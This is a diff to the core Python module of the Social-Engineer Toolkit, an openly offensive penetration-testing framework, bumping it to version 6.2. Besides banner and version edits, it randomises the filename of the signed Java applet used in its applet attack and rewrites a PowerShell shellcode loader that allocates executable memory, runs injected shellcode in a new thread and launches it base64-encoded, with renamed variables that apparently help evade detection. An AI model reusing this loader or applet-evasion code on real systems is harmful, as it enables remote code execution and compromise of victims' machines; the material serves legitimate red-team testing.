@@ -230,7 +230,7 @@ def print_error(message):
     print bcolors.RED + bcolors.BOLD + "[!] " + bcolors.ENDC + bcolors.RED + str(message) + bcolors.ENDC
 
 def get_version():
-    define_version = '6.1.2'
+    define_version = '6.2'
     return define_version
 
 class create_menu:
@@ -367,7 +367,7 @@ def grab_ipaddress():
         # if AUTO_DETECT=OFF prompt for IP Address
             match1 = re.search("AUTO_DETECT=OFF", line)
             if match1:
-                rhost = raw_input(setprompt("0", "IP address for the payload listener"))
+                rhost = raw_input(setprompt("0", "IP address for the payload listener (LHOST)"))
                 while 1:
                         # check if IP address is valid
                     ip_check = is_valid_ip(rhost)
@@ -610,8 +610,12 @@ def java_applet_attack(website, port, directory):
         # move the file to the specified directory and filename
         subprocess.Popen("cp %s/msf.exe %s/%s" % (setdir,directory,filename), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
+    applet_name = check_options("APPLET_NAME=")
+    if applet_name == "":
+	applet_name = generate_random_string(6, 15) + ".jar"
+
     # lastly we need to copy over the signed applet
-    subprocess.Popen("cp %s/Signed_Update.jar %s" % (setdir,directory), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+    subprocess.Popen("cp %s/Signed_Update.jar %s/%s" % (setdir,directory,applet_name), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
     # start the web server by running it in the background
     start_web_server(directory)
@@ -759,8 +763,8 @@ def show_banner(define_version,graphic):
     print bcolors.BLUE + """
 [---]        The Social-Engineer Toolkit ("""+bcolors.YELLOW+"""SET"""+bcolors.BLUE+""")         [---]
 [---]        Created by:""" + bcolors.RED+""" David Kennedy """+bcolors.BLUE+"""("""+bcolors.YELLOW+"""ReL1K"""+bcolors.BLUE+""")         [---]
-[---]                Version: """+bcolors.RED+"""%s""" % (define_version) +bcolors.BLUE+"""                    [---]
-[---]              Codename: '""" + bcolors.YELLOW + """Midnight""" + bcolors.BLUE + """'                [---]
+[---]                  Version: """+bcolors.RED+"""%s""" % (define_version) +bcolors.BLUE+"""                    [---]
+[---]               Codename: '""" + bcolors.YELLOW + """Recharge""" + bcolors.BLUE + """'               [---]
 [---]        Follow us on Twitter: """ + bcolors.PURPLE+ """@TrustedSec""" + bcolors.BLUE+"""         [---]
 [---]        Follow me on Twitter: """ + bcolors.PURPLE+ """@HackingDave""" + bcolors.BLUE+"""        [---]
 [---]       Homepage: """ + bcolors.YELLOW + """https://www.trustedsec.com""" + bcolors.BLUE+"""       [---]
@@ -772,7 +776,7 @@ def show_banner(define_version,graphic):
     print bcolors.BOLD + """   The Social-Engineer Toolkit is a product of TrustedSec.\n\n             Visit: """ + bcolors.GREEN + """https://www.trustedsec.com\n""" + bcolors.ENDC
 
 def show_graphic():
-    menu = random.randrange(2,12)
+    menu = random.randrange(2,13)
     if menu == 2:
         print bcolors.YELLOW + r"""
                  .--.  .--. .-----.
@@ -904,7 +908,7 @@ def show_graphic():
                        ,MMMMMMMMMMM 
                      
                 https://www.trustedsec.com""" + bcolors.ENDC
-
+    
     if menu == 11:
         print bcolors.backBlue + r"""
                           _                                           J
@@ -929,6 +933,30 @@ def show_graphic():
                  |   Timey Wimey   |                                  !
                  -------------------                                  !""" + bcolors.ENDC
 
+
+    if menu == 12:
+	print bcolors.RED + r"""
+                      ..:::::::::..
+                  ..:::aad8888888baa:::..
+              .::::d:?88888888888?::8b::::.
+            .:::d8888:?88888888??a888888b:::.
+          .:::d8888888a8888888aa8888888888b:::.
+         ::::dP::::::::88888888888::::::::Yb::::
+        ::::dP:::::::::Y888888888P:::::::::Yb::::
+       ::::d8:::::::::::Y8888888P:::::::::::8b::::
+      .::::88::::::::::::Y88888P::::::::::::88::::.
+      :::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::
+      :::::::Y88888888888P::|::Y88888888888P:::::::
+      ::::::::::::::::888:::|:::888::::::::::::::::
+      `:::::::::::::::8888888888888b::::::::::::::'
+       :::::::::::::::88888888888888::::::::::::::
+        :::::::::::::d88888888888888:::::::::::::
+         ::::::::::::88::88::88:::88::::::::::::
+          `::::::::::88::88::88:::88::::::::::'
+            `::::::::88::88::P::::88::::::::'
+              `::::::88::88:::::::88::::::'
+                 ``:::::::::::::::::::''
+                      ``:::::::::''""" + bcolors.ENDC
 
 #
 # identify if set interactive shells are disabled
@@ -1215,7 +1243,7 @@ def generate_powershell_alphanumeric_payload(payload,ipaddr,port, payload2):
         shellcode = newdata[:-1]
 
     # powershell command here, needs to be unicoded then base64 in order to use encodedcommand - this incorporates a new process downgrade attack where if it detects 64 bit it'll use x86 powershell. This is useful so we don't have to guess if its x64 or x86 and what type of shellcode to use
-    powershell_command = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = %s;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-nop -noni -enc ";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $gq";}""" %  (shellcode))
+    powershell_command = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-nop -noni -enc ";iex "& $x86 $cmd $e"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $e";}""" %  (shellcode))
 
     # unicode and base64 encode and return it
     return base64.b64encode(powershell_command.encode('utf_16_le'))
